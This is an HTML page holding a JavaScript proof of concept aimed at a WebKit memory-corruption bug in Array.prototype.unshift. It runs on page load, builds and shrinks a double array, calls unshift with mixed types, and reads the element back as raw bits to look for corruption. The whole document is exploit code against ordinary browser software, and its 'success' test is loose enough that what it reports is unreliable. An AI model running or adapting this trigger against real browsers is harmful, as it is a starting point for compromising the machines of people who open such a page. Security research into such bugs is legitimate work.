<!DOCTYPE html>
<html>
<head>
    <title>JSArray Unshift Exploit</title>
    <style>
        body {
            background: #000;
            color: #0f0;
            font-family: monospace;
            margin: 20px;
        }
        #log {
            border: 1px solid #0f0;
            padding: 10px;
            white-space: pre;
        }
    </style>
</head>
<body>
    <h2>WebKit Array Unshift PoC</h2>
    <div id="log">[+] Initializing exploit...</div>

    <script>
        (function() {
            const log = document.getElementById('log');
            let output = [];
            
            function updateLog(msg) {
                output.push(msg);
                if(output.length > 15) output.shift();
                log.textContent = output.join('\n');
            }

            function hex(num) {
                return '0x' + num.toString(16).padStart(16, '0');
            }

            function triggerExploit() {
                try {
                    // 1. Create optimized double array
                    updateLog('[1] Creating double array...');
                    let arr = [1.1];
                    for(let i = 0; i < 0x10000; i++) {
                        arr.push(1.1);
                    }
                    arr.length = 3;

                    // 2. Force ArrayWithDouble type
                    updateLog('[2] Compacting array...');
                    arr[0] = 1.1;
                    arr[1] = 2.2;
                    arr[2] = 3.3;

                    // 3. Trigger vulnerable unshift
                    updateLog('[3] Executing unshift...');
                    arr.unshift({}, 0.0);  // startIndex=1, count=2

                    // 4. Access corrupted elements
                    updateLog('[4] Reading corrupted values...');
                    let corrupted = arr[1];
                    
                    // 5. Convert to raw bytes
                    let buf = new ArrayBuffer(8);
                    new Float64Array(buf)[0] = corrupted;
                    let bytes = new BigUint64Array(buf)[0];
                    
                    updateLog(`[+] Corrupted value: ${hex(bytes)}`);
                    
                    // 6. Verify exploit success
                    if(bytes !== 0x3ff0000000000000n) {
                        updateLog('[!] EXPLOIT SUCCESS: Memory corruption detected!');
                    } else {
                        updateLog('[+] System patched');
                    }
                } catch(e) {
                    updateLog(`[ERROR] ${e}`);
                }
            }

            // Auto-execute after short delay
            setTimeout(triggerExploit, 100);
        })();
    </script>
</body>
</html>
